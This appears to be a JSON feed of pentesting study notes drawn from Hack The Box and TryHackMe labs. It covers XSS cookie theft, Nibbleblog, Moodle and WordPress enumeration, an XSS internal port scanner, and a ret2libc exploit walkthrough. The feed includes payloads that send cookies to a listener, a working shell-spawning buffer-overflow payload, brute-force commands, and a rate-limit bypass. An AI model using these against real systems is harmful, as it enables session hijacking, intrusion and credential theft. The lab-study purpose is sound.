<span class=\"o\">(</span>X11<span class=\"p\">;</span> Linux x86_64<span class=\"o\">)</span> AppleWebKit/537.36 <span class=\"o\">(</span>KHTML, like Gecko<span class=\"o\">)</span> Chrome/91.0.4472.114 Safari/537.36Accept: image/avif,image/webp,image/apng,image/svg+xml,image/<span class=\"k\">*</span>,<span class=\"k\">*</span>/<span class=\"k\">*</span><span class=\"p\">;</span><span class=\"nv\">q</span><span class=\"o\">=</span>0.8Referer: http://10.10.177.20/Accept-Encoding: <span class=\"nb\">gzip</span>, deflateAccept-Language: en-US,en<span class=\"p\">;</span><span class=\"nv\">q</span><span class=\"o\">=</span>0.9</code></pre></div></div><ul>  <li>You can use this method to grab an admin cookie</li>  <li>An alternative is using <code class=\"language-plaintext highlighter-rouge\">fetch</code> and redirecting it to your HTTP listener</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># using fetch</span>&lt;script&gt;fetch<span class=\"o\">(</span><span class=\"s2\">\"http://10.11.40.33:4444/\"</span>+document.cookie<span class=\"o\">)</span>&lt;/script&gt;</code></pre></div></div><ul>  <li>NOTE: There mght be delay in seeing the output so you might want to be patient</li></ul><h2 id=\"redirect-to-another-page\">Redirect to another page</h2><ul>  <li>Insert this payload to comment section</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 10.10.39.208 - victim ip</span>&lt;script&gt;document.location<span class=\"o\">=</span><span class=\"s1\">'http://10.10.39.208/log/'</span>+document.cookie&lt;/script&gt;</code></pre></div></div><ul>  <li>Refresh the page</li>  <li>Go to <code class=\"language-plaintext highlighter-rouge\">/logs</code></li></ul><p><img src=\"/spindel/assets/Cookie%20(Session)%20Hijacking/79797591-B0CB-47DA-A97A-26504675CB4D.png\" alt=\"\" /></p><h2 id=\"other-payloads\">Other payloads</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># sent by server -&gt; cookie: denied</span>cookie: granted</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB RedCross</li>  <li><a href=\"https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies\">Cookies Hacking - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/12/cookie-session-hijacking",
            
            
            
            "tags": ["web","xss"],
            
            "date_published": "2022-02-12T00:00:00+08:00",
            "date_modified": "2022-02-12T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/07/nibble",
            "title": "Nibble",
            "summary": "Nibble",
            "content_text": "Overview  No longer maintained  Successor is Bludit blogDefault Credentialsadmin:&lt;none&gt;Interesting URL Paths# contains version/README/admin/boot/rules/98-constants.bit# contains users/content/private/users.xml# others/admin.php/admin//content//content/private/plugins/my_image/db.xml/content/private/config.xmlIP BlacklistingNibbleblog blacklists an IP address for five minutes after five unsuccessful login attempts. We can confirm this configuration by checking  the source code .This can be bypassed by randomizing the X-Forwarded-For header. See bruteforce tool below.Exploits  Arbritraty File Upload Exploit (v4.0.3) - make sure to generate payload via msfvenom firstTools  Admin login page bruteforcerReferences  Nibbleblog - Easy, fast and free Blog system  eighty-two - Brute-forcing the admin password on Nibbles",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>No longer maintained</li>  <li>Successor is Bludit blog</li></ul><h2 id=\"default-credentials\">Default Credentials</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>admin:&lt;none&gt;</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># contains version</span>/README/admin/boot/rules/98-constants.bit<span class=\"c\"># contains users</span>/content/private/users.xml<span class=\"c\"># others</span>/admin.php/admin//content//content/private/plugins/my_image/db.xml/content/private/config.xml</code></pre></div></div><h2 id=\"ip-blacklisting\">IP Blacklisting</h2><p>Nibbleblog blacklists an IP address for five minutes after five unsuccessful login attempts. We can confirm this configuration by checking  <a href=\"https://github.com/dignajar/nibbleblog/blob/2a5f242d89b85c0aae2df95c4c95bc627ade54fd/admin/boot/rules/3-variables.bit#L44-L45\">the source code</a> .</p><p>This can be bypassed by randomizing the <code class=\"language-plaintext highlighter-rouge\">X-Forwarded-For</code> header. See bruteforce tool below.</p><h2 id=\"exploits\">Exploits</h2><ul>  <li><a href=\"https://github.com/TheRealHetfield/exploits\">Arbritraty File Upload Exploit (v4.0.3)</a> - make sure to generate payload via msfvenom first</li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://eightytwo.net/blog/brute-forcing-the-admin-password-on-nibbles/\">Admin login page bruteforcer</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.nibbleblog.com/\">Nibbleblog - Easy, fast and free Blog system</a></li>  <li><a href=\"https://eightytwo.net/blog/brute-forcing-the-admin-password-on-nibbles/\">eighty-two - Brute-forcing the admin password on Nibbles</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/07/nibble",
            
            
            
            "tags": ["web","enum","cms","php"],
            
            "date_published": "2022-02-07T00:00:00+08:00",
            "date_modified": "2022-02-07T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/06/moodle",
            "title": "Moodle",
            "summary": "Moodle",
            "content_text": "OverviewCMS for online learning for studentsFinding Versionhttps://docs.moodle.org/34/en/Single_viewCredentialsSeems there are no default creds. But we can try these:moodlebox:Moodlebox4$moodlebox:moodleboxInteresting Paths# might contains versions/mod/forum/upgrade.txt/composer.lock# stringnames.txt contains a list of all the strings used during the install processinstall/stringnames.txt# others/backup/mod/chat/?id=1/INSTALL.txtBrute Force# Haven't confirmed if this is workingwfuzz -c -Z --hl 296,6 -X POST -H 'Cookie: MoodleSession=u0chdlm9finmc3sscsuggodg75' -d \"username=admin&amp;password=FUZZ\" -w /usr/share/wordlists/rockyou.txt 'http://teacher.htb/moodle/login/index.php'References  Moodle - HackTricks  Forgotten creds  Unauthenticated Exploit  Moodle Penetration Testing - MoodleDocs  Site backup - MoodleDocs",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>CMS for online learning for students</p><h2 id=\"finding-version\">Finding Version</h2><p>https://docs.moodle.org/34/en/Single_view</p><h2 id=\"credentials\">Credentials</h2><p>Seems there are no default creds. But we can try these:</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>moodlebox:Moodlebox4$moodlebox:moodlebox</code></pre></div></div><h2 id=\"interesting-paths\">Interesting Paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># might contains versions</span>/mod/forum/upgrade.txt/composer.lock<span class=\"c\"># stringnames.txt contains a list of all the strings used during the install process</span><span class=\"nb\">install</span>/stringnames.txt<span class=\"c\"># others</span>/backup/mod/chat/?id<span class=\"o\">=</span>1/INSTALL.txt</code></pre></div></div><h2 id=\"brute-force\">Brute Force</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Haven't confirmed if this is working</span>wfuzz <span class=\"nt\">-c</span> <span class=\"nt\">-Z</span> <span class=\"nt\">--hl</span> 296,6 <span class=\"nt\">-X</span> POST <span class=\"nt\">-H</span> <span class=\"s1\">'Cookie: MoodleSession=u0chdlm9finmc3sscsuggodg75'</span> <span class=\"nt\">-d</span> <span class=\"s2\">\"username=admin&amp;password=FUZZ\"</span> <span class=\"nt\">-w</span> /usr/share/wordlists/rockyou.txt <span class=\"s1\">'http://teacher.htb/moodle/login/index.php'</span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-web/moodle\">Moodle - HackTricks</a></li>  <li><a href=\"https://docs.moodle.org/311/en/Administration_FAQ#I_have_forgotten_the_admin_password\">Forgotten creds</a></li>  <li><a href=\"https://portswigger.net/daily-swig/finders-cheaters-rce-bug-in-moodle-e-learning-platform-could-be-abused-to-steal-data-manipulate-results\">Unauthenticated Exploit</a></li>  <li><a href=\"https://docs.moodle.org/dev/Moodle_Penetration_Testing\">Moodle Penetration Testing - MoodleDocs</a></li>  <li><a href=\"https://docs.moodle.org/311/en/Site_backup\">Site backup - MoodleDocs</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/06/moodle",
            
            
            
            "tags": ["web","enum","cms"],
            
            "date_published": "2022-02-06T00:00:00+08:00",
            "date_modified": "2022-02-06T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/02/xss-port-scanning",
            "title": "XSS Port Scanning",
            "summary": "XSS Port Scanning",
            "content_text": "OverviewAn attacker which is outside of your internal network can force you to browse a webpage containing malicuous javascript.This javascript code will scan your internal network and can be modified to send results back to attacker.Sample Code&lt;script&gt;  for (let i = 0; i &lt; 256; i++) {    let ip = '192.168.0.' + i    let code = '&lt;img src=\"http://' + ip + '/favicon.ico\" onload=\"this.onerror=null; this.src=/log/' + ip + '\"&gt;'    document.body.innerHTML += code }&lt;/script&gt;References  https://neonprimetime.blogspot.com/2015/09/cross-site-scripting-xss-that-port-scans.html",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>An attacker which is outside of your internal network can force you to browse a webpage containing malicuous javascript.</p><p>This javascript code will scan your internal network and can be modified to send results back to attacker.</p><h2 id=\"sample-code\">Sample Code</h2><div class=\"language-javascript highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">&lt;</span><span class=\"nx\">script</span><span class=\"o\">&gt;</span>  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kd\">let</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"nx\">i</span> <span class=\"o\">&lt;</span> <span class=\"mi\">256</span><span class=\"p\">;</span> <span class=\"nx\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"kd\">let</span> <span class=\"nx\">ip</span> <span class=\"o\">=</span> <span class=\"dl\">'</span><span class=\"s1\">192.168.0.</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">i</span>    <span class=\"kd\">let</span> <span class=\"nx\">code</span> <span class=\"o\">=</span> <span class=\"dl\">'</span><span class=\"s1\">&lt;img src=\"http://</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">ip</span> <span class=\"o\">+</span> <span class=\"dl\">'</span><span class=\"s1\">/favicon.ico\" onload=\"this.onerror=null; this.src=/log/</span><span class=\"dl\">'</span> <span class=\"o\">+</span> <span class=\"nx\">ip</span> <span class=\"o\">+</span> <span class=\"dl\">'</span><span class=\"s1\">\"&gt;</span><span class=\"dl\">'</span>    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">innerHTML</span> <span class=\"o\">+=</span> <span class=\"nx\">code</span> <span class=\"p\">}</span><span class=\"o\">&lt;</span><span class=\"sr\">/script</span><span class=\"err\">&gt;</span></code></pre></div></div><p><img src=\"/spindel/assets/XSS%20Port%20Scanning/23CD500A-C9DD-4F00-A473-8A1F9AE4F120.png\" alt=\"\" /></p><h2 id=\"references\">References</h2><ul>  <li>https://neonprimetime.blogspot.com/2015/09/cross-site-scripting-xss-that-port-scans.html</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/02/xss-port-scanning",
            
            
            
            "tags": ["web","enum","foothold","xss"],
            
            "date_published": "2022-02-02T00:00:00+08:00",
            "date_modified": "2022-02-02T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/02/01/ret2libc-system",
            "title": "Ret2libc - system()",
            "summary": "Ret2libc - system()",
            "content_text": "Overview  This makes use of existing libc by calling system(\"/bin/sh\")  You can use this attack on the following scenarios:          NX bit is set (e.g it it SEGFAULTS on NOPs \\x90909090)      GNU_STACK doesn’t contain RWE in readelf -l ./app output        Example below is from HTB Frolic boxSample Program➜  loot ./rop hello                                                                                      [+] Message sent: hello                                                                            ➜  loot Steps  Find what buffer length program crashes➜  loot ./rop `python2 -c \"print('A'*100)\"`                                                              [1]    325422 segmentation fault  ./rop `python2 -c \"print('A'*100)\"`➜  loot # it crashes at about 100 characters  Find the exact locaton of EIP➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A➜  loot ➜  loot gdb ./rop[...redacted...](gdb) disas vuln[...redacted...]   0x08048508 &lt;+16&gt;:\tcall   0x8048350 &lt;strcpy@plt&gt;   0x0804850d &lt;+21&gt;:\tadd    $0x10,%esp[...redacted...]   0x08048531 &lt;+57&gt;:\tret    End of assembler dump.(gdb) br *vuln+16Breakpoint 1 at 0x8048508(gdb) br *vuln+21Breakpoint 2 at 0x804850d(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2AStarting program: /home/kali/data/practice/hack_the_box/linux/frolic/results/frolic/loot/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2ABreakpoint 1, 0x08048508 in vuln ()(gdb) cContinuing.Breakpoint 2, 0x0804850d in vuln ()(gdb) info frameStack level 0, frame at 0xffffce20: eip = 0x804850d in vuln; saved eip = 0x62413762 called by frame at 0xffffce24 Arglist at 0xffffce18, args:  Locals at 0xffffce18, Previous frame's sp is 0xffffce20 Saved registers:  ebp at 0xffffce18, eip at 0xffffce1c(gdb) quit[...redacted...]➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762[*] Exact match at offset 52➜  loot # EIP offset is 52  Find base address of libc➜  loot ldd ./rop          \tlinux-gate.so.1 (0xf7fcf000)\tlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7dbc000)\t/lib/ld-linux.so.2 (0xf7fd1000)➜  loot # libc_base_addr = 0xf7dbc000  Find address of system().➜  loot readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system  1561: 00045160    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0➜  loot # system_addr = libc_base_addr + 00045160#             = 0xf7e01160  Find address of exit()➜  loot readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit   152: 00037af0    33 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.0[...redacted...]➜  loot # exit_addr = libc_base_addr + 00037af0#           = 0xf7df3af0  Find address of /bin/sh➜  loot strings -tx /lib/i386-linux-gnu/libc.so.6 | grep \"/bin/sh\" 18f924 /bin/sh➜  loot # bin_sh_addr = libc_base_addr + 18f924#             = F7F4B924  Construct payload# NOP + system_addr + exit_addr + bin_sh_addrpython2 -c \"print('A'*52 + '\\x60\\x11\\xe0\\xf7' + '\\xf0\\x3a\\xdf\\xf7' + '\\x24\\xb9\\xf4\\xf7')\"  Run and enjoy➜  loot ./rop `python2 -c \"print('A'*52 + '\\x60\\x11\\xe0\\xf7' + '\\xf0\\x3a\\xdf\\xf7' + '\\x24\\xb9\\xf4\\xf7')\"`$ iduid=1000(kali) gid=1000(kali) groups=1000(kali),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),120(wireshark),134(scanner),142(kaboxer)$ Gotchas  If you tried the steps above by getting a copy of vulnerable program and testing it on your local or attacker machine, you might need to change the memory addresses (libc_base_addr, system_addr, and bin_sh_addr) once you run it on the victim machine. That’s because memory address on victim might be different from the attacker machine.References  Introduction to exploiting Part 4 – ret2libc – Stack6 (Protostar)  Performing a ret2libc Attack - defeating a non-executable stack",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>This makes use of existing <code class=\"language-plaintext highlighter-rouge\">libc</code> by calling <code class=\"language-plaintext highlighter-rouge\">system(\"/bin/sh\")</code></li>  <li>You can use this attack on the following scenarios:    <ul>      <li>NX bit is set (e.g it it SEGFAULTS on NOPs <code class=\"language-plaintext highlighter-rouge\">\\x90909090</code>)</li>      <li><code class=\"language-plaintext highlighter-rouge\">GNU_STACK</code> doesn’t contain <code class=\"language-plaintext highlighter-rouge\">RWE</code> in <code class=\"language-plaintext highlighter-rouge\">readelf -l ./app</code> output</li>    </ul>  </li>  <li>Example below is from HTB Frolic box</li></ul><h2 id=\"sample-program\">Sample Program</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot ./rop hello                                                                                      <span class=\"o\">[</span>+] Message sent: hello                                                                            ➜  loot </code></pre></div></div><h2 id=\"steps\">Steps</h2><ul>  <li>Find what buffer length program crashes</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot ./rop <span class=\"sb\">`</span>python2 <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*100)\"</span><span class=\"sb\">`</span>                                                              <span class=\"o\">[</span>1]    325422 segmentation fault  ./rop <span class=\"sb\">`</span>python2 <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*100)\"</span><span class=\"sb\">`</span>➜  loot <span class=\"c\"># it crashes at about 100 characters</span></code></pre></div></div><ul>  <li>Find the exact locaton of EIP</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class=\"nt\">-l</span> 100Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A➜  loot ➜  loot gdb ./rop<span class=\"o\">[</span>...redacted...]<span class=\"o\">(</span>gdb<span class=\"o\">)</span> disas vuln<span class=\"o\">[</span>...redacted...]   0x08048508 &lt;+16&gt;:\tcall   0x8048350 &lt;strcpy@plt&gt;   0x0804850d &lt;+21&gt;:\tadd    <span class=\"nv\">$0x10</span>,%esp<span class=\"o\">[</span>...redacted...]   0x08048531 &lt;+57&gt;:\tret    End of assembler dump.<span class=\"o\">(</span>gdb<span class=\"o\">)</span> br <span class=\"k\">*</span>vuln+16Breakpoint 1 at 0x8048508<span class=\"o\">(</span>gdb<span class=\"o\">)</span> br <span class=\"k\">*</span>vuln+21Breakpoint 2 at 0x804850d<span class=\"o\">(</span>gdb<span class=\"o\">)</span> run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2AStarting program: /home/kali/data/practice/hack_the_box/linux/frolic/results/frolic/loot/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2ABreakpoint 1, 0x08048508 <span class=\"k\">in </span>vuln <span class=\"o\">()</span><span class=\"o\">(</span>gdb<span class=\"o\">)</span> cContinuing.Breakpoint 2, 0x0804850d <span class=\"k\">in </span>vuln <span class=\"o\">()</span><span class=\"o\">(</span>gdb<span class=\"o\">)</span> info frameStack level 0, frame at 0xffffce20: eip <span class=\"o\">=</span> 0x804850d <span class=\"k\">in </span>vuln<span class=\"p\">;</span> saved eip <span class=\"o\">=</span> 0x62413762 called by frame at 0xffffce24 Arglist at 0xffffce18, args:  Locals at 0xffffce18, Previous frame<span class=\"s1\">'s sp is 0xffffce20 Saved registers:  ebp at 0xffffce18, eip at 0xffffce1c(gdb) quit[...redacted...]➜  loot /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762[*] Exact match at offset 52➜  loot # EIP offset is 52</span></code></pre></div></div><ul>  <li>Find base address of libc</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot ldd ./rop          \tlinux-gate.so.1 <span class=\"o\">(</span>0xf7fcf000<span class=\"o\">)</span>\tlibc.so.6 <span class=\"o\">=&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class=\"o\">(</span>0xf7dbc000<span class=\"o\">)</span>\t/lib/ld-linux.so.2 <span class=\"o\">(</span>0xf7fd1000<span class=\"o\">)</span>➜  loot <span class=\"c\"># libc_base_addr = 0xf7dbc000</span></code></pre></div></div><ul>  <li>Find address of <code class=\"language-plaintext highlighter-rouge\">system()</code>.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot readelf <span class=\"nt\">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class=\"nb\">grep </span>system  1561: 00045160    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0➜  loot <span class=\"c\"># system_addr = libc_base_addr + 00045160</span><span class=\"c\">#             = 0xf7e01160</span></code></pre></div></div><ul>  <li>Find address of <code class=\"language-plaintext highlighter-rouge\">exit()</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot readelf <span class=\"nt\">-s</span> /lib/i386-linux-gnu/libc.so.6 | <span class=\"nb\">grep exit   </span>152: 00037af0    33 FUNC    GLOBAL DEFAULT   14 <span class=\"nb\">exit</span>@@GLIBC_2.0<span class=\"o\">[</span>...redacted...]➜  loot <span class=\"c\"># exit_addr = libc_base_addr + 00037af0</span><span class=\"c\">#           = 0xf7df3af0</span></code></pre></div></div><ul>  <li>Find address of <code class=\"language-plaintext highlighter-rouge\">/bin/sh</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot strings <span class=\"nt\">-tx</span> /lib/i386-linux-gnu/libc.so.6 | <span class=\"nb\">grep</span> <span class=\"s2\">\"/bin/sh\"</span> 18f924 /bin/sh➜  loot <span class=\"c\"># bin_sh_addr = libc_base_addr + 18f924</span><span class=\"c\">#             = F7F4B924</span></code></pre></div></div><ul>  <li>Construct payload</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># NOP + system_addr + exit_addr + bin_sh_addr</span>python2 <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*52 + '</span><span class=\"se\">\\x</span><span class=\"s2\">60</span><span class=\"se\">\\x</span><span class=\"s2\">11</span><span class=\"se\">\\x</span><span class=\"s2\">e0</span><span class=\"se\">\\x</span><span class=\"s2\">f7' + '</span><span class=\"se\">\\x</span><span class=\"s2\">f0</span><span class=\"se\">\\x</span><span class=\"s2\">3a</span><span class=\"se\">\\x</span><span class=\"s2\">df</span><span class=\"se\">\\x</span><span class=\"s2\">f7' + '</span><span class=\"se\">\\x</span><span class=\"s2\">24</span><span class=\"se\">\\x</span><span class=\"s2\">b9</span><span class=\"se\">\\x</span><span class=\"s2\">f4</span><span class=\"se\">\\x</span><span class=\"s2\">f7')\"</span></code></pre></div></div><ul>  <li>Run and enjoy</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  loot ./rop <span class=\"sb\">`</span>python2 <span class=\"nt\">-c</span> <span class=\"s2\">\"print('A'*52 + '</span><span class=\"se\">\\x</span><span class=\"s2\">60</span><span class=\"se\">\\x</span><span class=\"s2\">11</span><span class=\"se\">\\x</span><span class=\"s2\">e0</span><span class=\"se\">\\x</span><span class=\"s2\">f7' + '</span><span class=\"se\">\\x</span><span class=\"s2\">f0</span><span class=\"se\">\\x</span><span class=\"s2\">3a</span><span class=\"se\">\\x</span><span class=\"s2\">df</span><span class=\"se\">\\x</span><span class=\"s2\">f7' + '</span><span class=\"se\">\\x</span><span class=\"s2\">24</span><span class=\"se\">\\x</span><span class=\"s2\">b9</span><span class=\"se\">\\x</span><span class=\"s2\">f4</span><span class=\"se\">\\x</span><span class=\"s2\">f7')\"</span><span class=\"sb\">`</span><span class=\"nv\">$ </span><span class=\"nb\">id</span><span class=\"nv\">uid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>kali<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>kali<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>kali<span class=\"o\">)</span>,20<span class=\"o\">(</span>dialout<span class=\"o\">)</span>,24<span class=\"o\">(</span>cdrom<span class=\"o\">)</span>,25<span class=\"o\">(</span>floppy<span class=\"o\">)</span>,27<span class=\"o\">(</span><span class=\"nb\">sudo</span><span class=\"o\">)</span>,29<span class=\"o\">(</span>audio<span class=\"o\">)</span>,30<span class=\"o\">(</span>dip<span class=\"o\">)</span>,44<span class=\"o\">(</span>video<span class=\"o\">)</span>,46<span class=\"o\">(</span>plugdev<span class=\"o\">)</span>,109<span class=\"o\">(</span>netdev<span class=\"o\">)</span>,118<span class=\"o\">(</span>bluetooth<span class=\"o\">)</span>,120<span class=\"o\">(</span>wireshark<span class=\"o\">)</span>,134<span class=\"o\">(</span>scanner<span class=\"o\">)</span>,142<span class=\"o\">(</span>kaboxer<span class=\"o\">)</span><span class=\"nv\">$ </span></code></pre></div></div><h2 id=\"gotchas\">Gotchas</h2><ul>  <li>If you tried the steps above by getting a copy of vulnerable program and testing it on your local or attacker machine, you might need to change the memory addresses (<code class=\"language-plaintext highlighter-rouge\">libc_base_addr</code>, <code class=\"language-plaintext highlighter-rouge\">system_addr</code>, and <code class=\"language-plaintext highlighter-rouge\">bin_sh_addr</code>) once you run it on the victim machine. That’s because memory address on victim might be different from the attacker machine.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://ironhackers.es/en/tutoriales/introduccion-al-exploiting-parte-4-ret2libc-stack-6-protostar/\">Introduction to exploiting Part 4 – ret2libc – Stack6 (Protostar)</a></li>  <li><a href=\"https://shellblade.net/files/docs/ret2libc.pdf\">Performing a ret2libc Attack - defeating a non-executable stack</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/02/01/ret2libc-system",
            
            
            
            "tags": ["bof","privesc"],
            
            "date_published": "2022-02-01T00:00:00+08:00",
            "date_modified": "2022-02-01T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/01/31/wordpress",
            "title": "Wordpress",
            "summary": "Wordpress",
            "content_text": "Version  On meta generators  Check interesting URL paths belowCredentials  Seems you really need to find valid credentials to wordpress before exploiting  Try going to /?author=1 and enumerate from there to see the usernames  There is no default credentials. Installation will ask user to provide the creds.  You can guess valid usernames thoughRecon# Kickoff nmapnmap -p80 --script http-wordpress-enum,http-wordpress-users 10.10.71.200# Using wpscan (you can remove api token but some# information will not be displayed)# NOTE: wpscan may not report all vulnerabilities specially# on pluginswpscan --url http://10.10.10.29 --api-token {API_TOKEN}# Similar to above but on another pathwpscan --url http://10.10.10.29/wordpress --api-token {API_TOKEN}  Check for colorlib in HTML elements. This is a WP plugin.Interesting URL Paths# you may find version here/wp-links-opml/wp-links-opml.php/readme.html# uploads directory/wp-content/uploads/YYYY/DD/FILENAME# login/wp-login.phpInteresting files# DB credentialswp-config.phpBrute Force# Using nmapmap -p80 --script http-wordpress-brute 10.10.10.29# User IDs can be extracted from here. You can use# burp sniper intruder and generate a list of user# id from 1 to 100 using bash for loop.curl -s -I -X GET http://10.10.10.29/?author=1# You can use this python script from# https://github.com/relarizky/wpxploit# This can take around 30 minutes to complete# TIP: try using \"admin\" as username firstcd ~/data/tools/webapp/wpxploit./exploit.py http://10.10.127.229/wordpress 5 15# You can also use wpscanwpscan --url http://10.10.127.229/wordpress --usernames admin --passwords /usr/share/wordlists/rockyou.txt  Once you have the credentials you can try uploading a PHP reverse shell  TIP: bruteforce is done by sending this POST data containing username and password&lt;methodCall&gt;  &lt;methodName&gt;    wp.getUsersBlogs  &lt;/methodName&gt;  &lt;params&gt;    &lt;param&gt;      &lt;value&gt;        admin      &lt;/value&gt;    &lt;/param&gt;    &lt;param&gt;      &lt;value&gt;        gansta1      &lt;/value&gt;    &lt;/param&gt;  &lt;/params&gt;&lt;/methodCall&gt;Interesting URL Paths# most can be reported by wpscan/wp-content/uploads//wp-admin//wp-admin/update-core.php/wp-admin/upgrade.php/install.php/wp-cron.php# can accept post requests if active/xmlrpc.php# others/plugins/wp-content/pluginsFor xmlrpc.php, you can use burpsuite to send some POST requests like this.POST /wordpress/xmlrpc.php HTTP/1.1Host: 10.10.10.29User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 